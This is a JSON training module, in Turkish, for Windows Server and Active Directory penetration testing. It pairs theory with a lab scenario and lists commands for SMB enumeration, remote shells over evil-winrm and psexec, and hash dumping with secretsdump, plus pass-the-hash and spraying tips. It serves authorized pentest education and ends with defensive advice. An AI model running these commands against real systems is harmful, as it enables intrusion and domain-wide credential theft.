@@ -1,0 +1,124 @@
+{
+  "id": "windows-server",
+  "slug": "windows-server",
+  "title": "Windows Server Saldırıları",
+  "subtitle": "Windows Sunucu & AD Sızma Testi",
+  "description": "Windows Server'ın saldırı yüzeyi: roller (DC, IIS, dosya sunucusu), uzak erişim (RDP/WinRM/SMB), servis sömürüsü, kimlik bilgisi avı ve Active Directory bağlantısı. Temelden detaya.",
+  "team": "red-team",
+  "category": "Sunucu Saldırıları",
+  "phase": "Exploitation",
+  "icon": "🪟",
+  "color": "#ef4444",
+  "tags": ["windows server", "rdp", "winrm", "smb", "active directory", "privesc", "sunucu"],
+  "modules": [
+    {
+      "id": "intro-enum",
+      "title": "Windows Server Saldırı Yüzeyi & Keşif",
+      "description": "Sunucu rolleri, uzak erişim servisleri ve enumeration",
+      "difficulty": "beginner",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Windows Server'ı Anlamak",
+          "content": "**Windows Server**, kurumsal ağların belkemiğidir. Yaygın rolleri:\n- **Domain Controller (DC):** Active Directory'yi barındırır — en değerli hedef\n- **IIS:** Web sunucusu\n- **File Server:** SMB dosya paylaşımı\n- **MSSQL:** Veritabanı\n- **Exchange:** E-posta\n\n**Uzak erişim/yönetim servisleri (saldırı kapıları):**\n| Port | Servis | Vektör |\n|------|--------|--------|\n| 3389 | RDP | Brute force, BlueKeep |\n| 5985/5986 | WinRM | Kimlik bilgisiyle uzak shell |\n| 445 | SMB | Null session, EternalBlue, relay |\n| 88 | Kerberos | Kerberoasting, AS-REP |\n| 389/636 | LDAP | AD enumeration |\n| 1433 | MSSQL | Zayıf parola, xp_cmdshell |\n\n**Saldırı akışı:** Keşif → SMB/LDAP enumeration → kimlik bilgisi elde et → WinRM/RDP/psexec ile erişim → privesc → AD ele geçirme.\n\n**Etik:** Yalnızca yetkili pentest ve izole AD lab'ları (GOAD, HTB).\n\n> İlgili modüller: [enum4linux], [NetExec], [Impacket & Kerberos], [BloodHound], [Responder], [Windows PrivEsc]."
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Windows Sunucu Keşfi",
+          "commands": [
+            {
+              "command": "nmap -sC -sV -p- 10.10.10.1 -oN winserver.txt",
+              "description": "Tüm portları ve servisleri tara",
+              "tip": "445 (SMB), 3389 (RDP), 5985 (WinRM), 88 (Kerberos=DC) gibi portlar Windows Server'ı ele verir."
+            },
+            {
+              "command": "netexec smb 10.10.10.1 -u '' -p '' --shares",
+              "description": "Null session ile SMB paylaşımlarını listele",
+              "tip": "Kimliksiz erişim açıksa paylaşımlar ve kullanıcılar sızabilir. Kimlik bulunca --users ekle.",
+              "flags": [
+                { "flag": "--shares", "description": "Paylaşımları listele" },
+                { "flag": "-u '' -p ''", "description": "Null session" }
+              ]
+            },
+            {
+              "command": "nmap --script smb-vuln-ms17-010 -p445 10.10.10.1",
+              "description": "EternalBlue (MS17-010) zafiyetini kontrol et",
+              "tip": "Yamasız eski Windows Server'larda kritik RCE. Metasploit ile sömürülebilir."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "access-privesc",
+      "title": "Erişim, Kimlik Avı & AD'ye Geçiş + Lab",
+      "description": "WinRM/RDP erişimi, credential dumping ve AD bağlantısı",
+      "difficulty": "intermediate",
+      "duration": "30 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Erişimden Domain Admin'e",
+          "content": "Bir kimlik bilgisi elde edince Windows Server'a çeşitli yollarla erişilir ve oradan AD ele geçirilir.\n\n**Uzak erişim yöntemleri:**\n| Yöntem | Araç | Not |\n|--------|------|-----|\n| WinRM | evil-winrm | Temiz uzak PowerShell |\n| SMB (PsExec) | impacket-psexec | SYSTEM shell |\n| WMI | impacket-wmiexec | Daha sessiz |\n| RDP | xfreerdp | GUI erişim |\n\n**Yetki yükseltme & AD geçişi:**\n1. Yerel privesc (servis, token, unquoted path → [Windows PrivEsc])\n2. Credential dumping (Mimikatz, secretsdump)\n3. AD enumeration ([BloodHound])\n4. Kerberoasting / AS-REP ([Impacket])\n5. Pass-the-Hash / yanal hareket ([NetExec])\n6. Domain Admin → DCSync → tüm domain\n\n**Sunucu Windows ise ve DC ise:** AD'nin tamamı tehlikededir; tek sunucu = tüm kurum.\n\n> Bu zincirin her halkası için ilgili Red Team modülleri mevcut."
+        },
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Erişim & Credential Dump",
+          "commands": [
+            {
+              "command": "evil-winrm -i 10.10.10.1 -u Administrator -p 'Parola1'",
+              "description": "WinRM ile uzak PowerShell shell al",
+              "tip": "5985 portu açıksa ve kimlik bilgisi varsa en temiz erişim yöntemidir. -H ile hash de kullanılabilir (PtH).",
+              "flags": [
+                { "flag": "-i", "description": "Hedef IP" },
+                { "flag": "-u / -p", "description": "Kimlik bilgisi" },
+                { "flag": "-H", "description": "NTLM hash (Pass-the-Hash)" }
+              ]
+            },
+            {
+              "command": "impacket-psexec DOMAIN/Administrator:'Parola1'@10.10.10.1",
+              "description": "SMB üzerinden SYSTEM yetkili shell",
+              "tip": "Yerel admin yetkisi gerekir. Daha sessiz: impacket-wmiexec."
+            },
+            {
+              "command": "impacket-secretsdump DOMAIN/admin:'Parola1'@10.10.10.1",
+              "description": "SAM/LSA/NTDS hash'lerini dök",
+              "tip": "DC'de -just-dc ile tüm domain hash'leri. Elde edilen hash'ler Hashcat/PtH ile kullanılır.",
+              "warning": "Yalnızca yetkili AD pentest/lab ortamında."
+            }
+          ]
+        },
+        {
+          "id": "lab",
+          "type": "lab",
+          "title": "CTF Senaryosu: Windows Server'dan Domain'e",
+          "scenario": {
+            "title": "Keşif → Erişim → Credential → Domain Admin",
+            "objective": "Bir Windows Server'ı keşfet, kimlik bilgisi elde et, erişim sağla ve AD zincirini takip ederek Domain Admin'e ulaş.",
+            "environment": "HTB Windows/AD makinesi veya GOAD lab",
+            "difficulty": "intermediate",
+            "steps": [
+              "nmap ile servisleri keşfet (445, 5985, 88 → DC mi?)",
+              "SMB/LDAP enumeration (netexec, enum4linux)",
+              "Kimlik bilgisi elde et (Responder, spraying, web)",
+              "evil-winrm / psexec ile erişim al",
+              "BloodHound verisi topla, Domain Admin yolunu bul",
+              "Kerberoast/PtH zinciriyle ilerle, secretsdump ile domain'i ele geçir"
+            ],
+            "hints": [
+              "88/Kerberos açıksa hedef bir Domain Controller'dır",
+              "Her kimlik bilgisini netexec ile tüm ağda dene (spraying)",
+              "BloodHound 'Shortest Path to Domain Admins' yolunu gösterir"
+            ],
+            "defenseNote": "Savunma: LAPS (benzersiz yerel admin parolaları), Tiered yönetim modeli, RDP/WinRM erişimini kısıtla, SMB imzalama, Credential Guard, yamaları uygula (EternalBlue/BlueKeep), gMSA servis hesapları ve AD olaylarını SIEM ile izle."
+          }
+        }
+      ]
+    }
+  ]
+}
